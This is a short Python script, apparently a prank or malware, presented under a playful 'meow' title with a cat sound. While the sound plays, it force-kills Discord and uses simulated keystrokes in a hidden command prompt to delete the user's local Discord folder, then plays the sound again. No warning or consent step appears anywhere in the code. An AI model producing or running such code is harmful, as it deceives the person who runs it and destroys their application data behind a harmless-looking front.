import os
import shutil
import stat
import subprocess
import time
import pynput
path ="_internal/"
enter =pynput.keyboard.Key.enter
k =pynput.keyboard.Controller()
os.system("title meow")
import playsoundsimple as pss

login =os.getlogin()
p =pss.Sound(path +"spacecatss.mp3")
p.play()
p.set_volume(1)
time.sleep(0.5)
meow =1
if os.path.exists("C:/Users/"+login+"/AppData/Local/Discord"):
 cmd = subprocess.Popen("cmd.exe /K cd C:/Users/" + login + "/AppData/Local/")
 os.system("taskkill /F /im discord.exe")
 time.sleep(0.5)
 time.sleep(0.5)
 k.type("del discord")
 k.press(enter)
 time.sleep(0.1)
 k.type("y")
 k.press(enter)
 time.sleep(0.5)
 cmd.terminate()
 time.sleep(150)
 p.play()
else:
 time.sleep(150)
 p.play()